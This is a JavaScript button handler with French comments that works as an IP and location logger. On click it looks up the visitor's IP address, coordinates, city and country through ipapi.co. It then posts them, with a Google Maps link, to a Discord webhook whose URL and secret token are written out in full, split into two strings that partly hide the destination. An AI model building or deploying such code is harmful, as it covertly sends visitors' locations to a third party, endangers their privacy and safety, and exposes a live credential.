document.getElementById('get-info-btn').addEventListener('click', function() {
    // Fonction pour obtenir l'URL du webhook Discord
    function getWebhookUrl() {
        // Remplacez les parties par les segments de votre URL de webhook Discord
        let part1 = 'https://discord.com/api/webhooks/1243652550251515914';
        let part2 = 'SrRtaX_dz1S_l1rKGroUHBmvvzBSqVfcWpe07WKJQ8nvLFeIImfe-XgBBlDcT6r_00VU';
        return `${part1}/${part2}`;
    }

    fetch('https://ipapi.co/json/') // Utilisation de l'API sécurisée ipapi.co
        .then(response => {
            if (!response.ok) {
                throw new Error('Erreur HTTP, statut : ' + response.status);
            }
            return response.json();
        })
        .then(data => {
            if (data) {
                // Extraire l'adresse IP au format IPv4
                let ipAddress = data.ip.split(',')[0]; // Prendre la première adresse IP si elle est multiple

                let message = {
                    content: `
                        **Utilisateur a cliqué sur le bouton**
                        \nL'adresse IP est : ${ipAddress}
                        \nLocalisation approximative :
                        \nLatitude : ${data.latitude}, Longitude : ${data.longitude}
                        \nVille : ${data.city}, Région : ${data.region}, Pays : ${data.country_name}
                        \n[Google Maps](https://www.google.com/maps?q=${data.latitude},${data.longitude})
                    `
                };

                let webhookUrl = getWebhookUrl();

                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message)
                }).then(response => {
                    if (response.ok) {
                        alert('Les informations ont été envoyées avec succès au webhook Discord.');
                    } else {
                        throw new Error('Erreur lors de l\'envoi au webhook Discord, statut : ' + response.status);
                    }
                }).catch(error => {
                    console.error('Erreur lors de l\'envoi au webhook Discord:', error);
                    alert('Erreur lors de l\'envoi au webhook Discord. Veuillez réessayer.');
                });

                document.getElementById('info-display').innerText = `
                    L'adresse IP est : ${ipAddress}
                    \nLocalisation approximative :
                    \nLatitude : ${data.latitude}, Longitude : ${data.longitude}
                    \nVille : ${data.city}, Région : ${data.region}, Pays : ${data.country_name}
                    \n[Google Maps](https://www.google.com/maps?q=${data.latitude},${data.longitude})
                `;
            } else {
                throw new Error('Erreur : Aucune donnée retournée par l\'API.');
            }
        })
        .catch(error => {
            document.getElementById('info-display').innerText = 'Erreur lors de la récupération des informations : ' + error.message;
            console.error('Erreur lors de la récupération des informations :', error);
        });
});
